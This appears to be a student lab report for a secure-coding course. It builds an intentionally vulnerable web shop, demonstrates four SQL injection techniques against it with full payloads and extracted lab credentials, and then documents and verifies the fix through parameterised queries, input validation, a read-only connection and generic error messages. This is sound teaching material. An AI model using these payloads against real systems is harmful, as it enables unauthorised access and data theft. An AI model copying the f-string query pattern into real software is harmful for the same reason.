# SQL Injection - Build & Defend

**Module:** WEB404 Secure Coding Practices - Assignment 1 (Topic 1)
**Author:** waangmo22@gmail.com
**Artefacts:** `vulnerable/app.py`, `fixed/app.py`, `exploits/*.sh`, `evidence/demo-output.txt`

---

## 1. Summary

A small e-commerce web app ("VulnShop") exposes three database-backed features:
a login form, a product name search, and a product lookup by numeric id. In the
vulnerable build every SQL statement is assembled with Python f-strings, pasting
the raw request parameters into the query text. This report demonstrates **four**
injection techniques against that build:

| # | Technique | Endpoint | Impact demonstrated |
| - | --------- | -------- | ------------------- |
| 1 | Boolean-based authentication bypass | `POST /login` | Log in as `admin` with no valid password |
| 2 | UNION-based extraction | `GET /search?q=` | Dump every row of `users` (usernames + plaintext passwords) |
| 3 | Error-based disclosure | `GET /search`, `GET /product` | Server returns raw SQLite errors + full query text |
| 4 | Blind boolean-based extraction | `GET /product?id=` | Recover `admin`'s password one character at a time from a page that never prints data |

The `fixed/app.py` build keeps the identical feature set, HTML and database, and
changes only the data-access layer. After the fix **all four exploits fail** (see
section 5 and `evidence/demo-output.txt`).

The assignment brief asks for at least two techniques (e.g. UNION-based and
blind/boolean-based); both of those are covered, plus authentication bypass and
error-based disclosure.

---

## 2. Vulnerability mechanism

A SQL query is source code. When the application does this
(`vulnerable/app.py`, `login()`):

```python
query = (
    "SELECT id, username, role FROM users "
    f"WHERE username = '{username}' AND password = '{password}'"
)
row = conn.execute(query).fetchone()
```

Here the string `username` is concatenated **into the code** before the database
parser ever sees it. The parser then reads the whole thing - trusted template
and untrusted input alike - as one program. If the input contains SQL
metacharacters (`'`, `--`, `UNION`, `OR`, `;`), those characters are parsed as
*grammar*, not as *data*. The attacker is effectively editing the query.

The three vulnerable sinks and the parser context each one creates:

| Endpoint | Vulnerable statement (built by f-string) | Injection context |
| --- | --- | --- |
| `POST /login` | `... WHERE username = '<in>' AND password = '<in>'` | inside a single-quoted string literal |
| `GET /search` | `... WHERE name LIKE '%<in>%'` | inside a single-quoted `LIKE` literal |
| `GET /product` | `... WHERE id = <in>` | **numeric** context - no quotes to break out of |

Two aggravating misconfigurations in the vulnerable build make exploitation
easier and are common in the wild:

* **Verbose errors** - `except sqlite3.Error` returns `str(exc)` *and the full
  query* to the browser, giving the attacker an oracle and the exact schema.
* **Full-privilege DB handle** - `sqlite3.connect(DB_PATH)` opens read/write, so
  an injection is not limited to `SELECT`.

### Why this maps to a known class

This is OWASP **A03:2021 - Injection**, CWE-89. It remains one of the highest-impact
web vulnerabilities because a single unsafe sink usually exposes the *entire*
database, and often the host, regardless of application-level access control.

---

## 3. Exploitation walkthrough

Setup:

```bash
cd Assigments/Assigment_1
python3 db/seed.py
python3 vulnerable/app.py    # http://127.0.0.1:5001
```

All payloads below are also wired into `exploits/0X-*.sh`. Run everything at once
with `bash exploits/run-demo.sh`. For the marked screenshots, replay the same
requests in Burp Suite Repeater / OWASP ZAP (see `evidence/README.md`).

### 3.1 Technique 1 - Boolean-based authentication bypass (`POST /login`)

**Goal:** authenticate without credentials.

**Request:**

```
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=' OR '1'='1' -- &password=anything
```

**Payload logic** - the resulting query becomes:

```sql
SELECT id, username, role FROM users
WHERE username = '' OR '1'='1' -- ' AND password = 'anything'
```

* `'` closes the empty username literal
* `OR '1'='1'` makes the `WHERE` clause true for every row
* `-- ` (trailing space required) comments out the password check

`fetchone()` returns the first row - `id 1`, `admin` - and the app prints
`Welcome back, admin (role: admin).`

**Observed result:**

```
RESULT  : BYPASSED -> Welcome back, admin (role: admin).
```

**Tools:** `exploits/01-auth-bypass.sh`; Burp Repeater. Screenshot:
`evidence/01-authbypass-vuln.png`.

### 3.2 Technique 2 - UNION-based extraction (`GET /search?q=`)

**Goal:** read a different table (`users`) through the product search.

The search result set has **3 columns** (`id, name, price`), so the injected
`SELECT` must also have 3 columns. Column 2 is text, so it carries the loot.

**Request:**

```
GET /search?q=zzz%25' UNION SELECT id, username || ':' || password, role FROM users -- 
```

(`%25` is the URL-encoding of `%`; the scripts use `curl --data-urlencode` so you
type the raw payload.)

**Payload logic** - the query becomes:

```sql
SELECT id, name, price FROM products
WHERE name LIKE '%zzz%' UNION SELECT id, username || ':' || password, role FROM users -- %'
```

* `zzz` matches no product, so only the injected rows are returned
* `%'` closes the `LIKE` literal
* `UNION SELECT ...` appends every user row
* `username || ':' || password` concatenates the two fields into column 2
* `-- ` comments out the trailing `%'`

**Observed result:**

```
RESULT  : EXTRACTED credentials from users table:
          #1 - admin:S3cr3t_admin_pw! - admin
          #2 - alice:alice-summer-2024 - customer
          #3 - bob:hunter2 - customer
```

The same class of payload also reads SQLite metadata, e.g.
`... UNION SELECT 1, sql, 3 FROM sqlite_master -- ` to dump the full schema, or
`... UNION SELECT 1, secret_supplier, 3 FROM products -- ` to leak the confidential
supplier-contract column that the feature is never meant to expose.

**Tools:** `exploits/02-union-based.sh`; Burp Repeater. Screenshot:
`evidence/02-union-vuln.png`.

### 3.3 Technique 3 - Error-based disclosure (`GET /search`, `GET /product`)

**Goal:** confirm the injection point and read the query/schema straight from
error messages.

**Request A:** `GET /search?q='`  ->  **Response body:**

```
SQL error: unrecognized token: "'"
query:     SELECT id, name, price FROM products WHERE name LIKE '%'%'
```

**Request B:** `GET /product?id=(SELECT 1 FROM no_such_table)`  ->  **Response body:**

```
SQL error: no such table: no_such_table
query:     SELECT id, name, description FROM products WHERE id = (SELECT 1 FROM no_such_table)
```

A single quote is enough to break the syntax; the handler then hands the
attacker the exception text and the exact statement, including table and column
names. On other engines (MySQL/Postgres) the same pattern leaks data directly
via functions like `extractvalue()` or `CAST(... AS int)`.

**Tools:** `exploits/03-error-based.sh`; browser / Burp. Screenshot:
`evidence/03-error-vuln.png`.

### 3.4 Technique 4 - Blind boolean-based extraction (`GET /product?id=`)

**Goal:** read data from an endpoint that **never prints database content** - it
only says `Product #...` (a row matched) or `No such product.` (no row). That one
bit is a boolean oracle.

**Numeric context** - no quote to escape. Base payload:

```
id = -1 OR (SELECT substr(password,<pos>,1) FROM users WHERE username='admin') = char(<code>)
```

* `id = -1` matches nothing by itself
* when the `OR` predicate is **TRUE**, every row matches -> response contains
  `Product #` -> the guessed character at position `<pos>` is correct
* when **FALSE**, no row matches -> `No such product.`
* `char(<code>)` compares by code point, so the guessed character never has to be
  quoted (works for `!`, `#`, `%`, ...)

Iterating `<pos>` from 1 and `<code>` over a charset recovers the value:

```
GET /product?id=-1 OR (SELECT substr(password,1,1) FROM users WHERE username='admin')=char(83)   -> "Product #1: ..."     (TRUE  -> char 1 is 'S')
GET /product?id=-1 OR (SELECT substr(password,1,1) FROM users WHERE username='admin')=char(65)   -> "No such product."  (FALSE -> not 'A')
```

**Observed result** (`exploits/04-boolean-blind.sh`, ~1.1k requests):

```
[*] recovered: S3cr3t_admin_pw!
RESULT  : EXTRACTED admin password = S3cr3t_admin_pw!
```

This technique is what `sqlmap` automates; the script here is a hand-rolled
version so the mechanism is visible.

**Tools:** `exploits/04-boolean-blind.sh`; Burp Repeater/Intruder. Screenshot:
`evidence/04-blind-vuln.png`.

---

## 4. Impact

* **Authentication bypass** - full admin access with no credentials (Technique 1).
* **Total confidentiality loss** - every table is readable through one search box:
  user credentials, password/session data, and the `secret_supplier` column the
  application deliberately hides (Techniques 2 & 4).
* **Schema disclosure** - table and column names handed over via errors, removing
  any "security through obscurity" (Technique 3).
* **Integrity / availability risk** - because the vulnerable build uses a
  read/write connection, payloads such as `'; UPDATE users SET role='admin' ...`
  or `DROP TABLE` are possible on engines/drivers that allow stacked queries.
  (Python's `sqlite3` blocks multiple statements in one `execute()`, which is why
  the demo focuses on read-path attacks; the read/write handle is still a real
  weakness and is fixed in section 5.)
* **Note on the data model:** passwords are stored in plaintext *on purpose* so
  the UNION dump is easy to read. Storing password hashes (bcrypt/argon2) is a
  separate control that limits the damage of a dump but does **not** stop the
  injection - the fix below is what closes the vulnerability.

---

## 5. Remediation

`fixed/app.py` is a line-for-line hardening of `vulnerable/app.py`. Inspect it
with:

```bash
diff -u vulnerable/app.py fixed/app.py
```

### 5.1 Primary control - parameterised queries

Every statement now uses bound `?` placeholders. The SQL text is a **fixed
constant**; the values travel to the engine out-of-band.

| Endpoint | Before | After |
| --- | --- | --- |
| `/login` | `f"... WHERE username = '{username}' AND password = '{password}'"` | `conn.execute("... WHERE username = ? AND password = ?", (username, password))` |
| `/search` | `f"... WHERE name LIKE '%{q}%'"` | `conn.execute("... WHERE name LIKE ?", (f"%{q}%",))` - the `%` wildcards are added to the *value*, not the SQL |
| `/product` | `f"... WHERE id = {pid}"` | `conn.execute("... WHERE id = ?", (int(pid),))` |

### 5.2 Defence in depth

| Control | Where | What it stops |
| --- | --- | --- |
| **Input validation** | `/product`: `ID_RE = ^[0-9]{1,9}$`, reject otherwise; `/search`: length cap `MAX_SEARCH_LEN = 100` | Rejects non-numeric `id` payloads before they reach the DB; bounds the search term |
| **Least privilege** | `db()` opens `file:...?mode=ro` (read-only) | Any `UPDATE`/`INSERT`/`DROP` raises "attempt to write a readonly database" - no integrity/availability impact. Mirrors using a DB account with `SELECT`-only grants in production |
| **Safe error handling** | `except sqlite3.Error:` logs to `stderr`, returns a generic `"Sorry, something went wrong."` | Removes the error-based oracle and the schema leak |
| **Generic auth response** | `/login` returns `"Login failed."` for both unknown user and wrong password | Removes login as a boolean oracle |

### 5.3 Further hardening (noted, not required by the brief)

* Store password **hashes** (argon2id / bcrypt) and use a constant-time compare.
* Add rate limiting / lockout on `/login`.
* A WAF rule (e.g. ModSecurity CRS 942xxx) as an outer layer - detection only,
  never the primary control.

---

## 6. Verification - proof the exploits no longer work

`bash exploits/run-demo.sh` runs each exploit against the vulnerable build
(:5001) and the fixed build (:5002). Full transcript: `evidence/demo-output.txt`.

| Technique | vs vulnerable `:5001` | vs fixed `:5002` |
| --- | --- | --- |
| 1 - auth bypass | `BYPASSED -> Welcome back, admin (role: admin).` | `blocked -> Login failed.` |
| 2 - UNION extraction | `EXTRACTED credentials ... admin:S3cr3t_admin_pw! ...` | `blocked -> payload treated as a literal search string (0 result(s))` |
| 3 - error-based | `LEAK  SQL error: unrecognized token ...` + full query | `no error leaked (0 result(s))` / `(Invalid product id.)` |
| 4 - blind boolean | `EXTRACTED admin password = S3cr3t_admin_pw!` | `blocked (no TRUE/FALSE oracle - endpoint rejected the payload)` |

See screenshots `evidence/0X-*-fixed.png` and `evidence/diff.png`.

---

## 7. Why the fix works

With a parameterised statement the driver sends the SQL text to the database
engine **once**, and the engine parses and plans it while the placeholders are
still empty. The query's structure - which tables, which columns, the `WHERE`
shape - is fixed at that moment. The parameter values are then supplied
separately and bound into the already-compiled plan as **typed data**. They are
never fed back through the SQL grammar, so they cannot become keywords,
operators, string terminators, comments, or a second statement.

Concretely, against `fixed/app.py`:

* Technique 1: `username` is the literal 12-character string
  `' OR '1'='1' -- `. The engine compares that whole string to the `username`
  column. No user equals it -> `Login failed.`
* Technique 2: the entire `zzz%' UNION SELECT ...` string is bound as the `LIKE`
  pattern. The engine looks for products whose name *contains that text*. None
  do -> `0 result(s)`.
* Technique 3: there is no syntax to break, so no exception; and even a genuine
  DB error is caught and replaced with a generic message.
* Technique 4: `-1 OR (SELECT ...)` fails the `^[0-9]{1,9}$` check and is rejected
  as `Invalid product id.` before any query runs - the oracle never responds.

The read-only connection is a backstop: if a new unsafe sink were ever added,
it still could not modify or destroy data.

---

## 8. Mapping to learning outcomes

| LO | Where addressed |
| --- | --- |
| LO2 - attack mechanisms | section 2 (parser-level mechanism), section 3 (four techniques executed) |
| LO4 - server-side vulnerabilities | sections 2-3 (server-side query construction sinks) |
| LO5 - assess effectiveness of fixes | section 6 (before/after matrix), `run-demo.sh` re-tests every exploit |
| LO6 - secure development | section 5 (parameterisation, validation, least privilege, safe errors), `fixed/app.py` |

## 9. References

* OWASP Top 10 2021 - **A03:2021 Injection**.
* OWASP **SQL Injection Prevention Cheat Sheet** (parameterised queries as the
  primary defence; allow-list input validation and least privilege as defence in
  depth).
* MITRE **CWE-89** - Improper Neutralization of Special Elements used in an SQL
  Command.
* Python `sqlite3` docs - placeholder / parameter substitution.

## Appendix - full demo transcript

See `evidence/demo-output.txt` (regenerate with `bash exploits/run-demo.sh`).
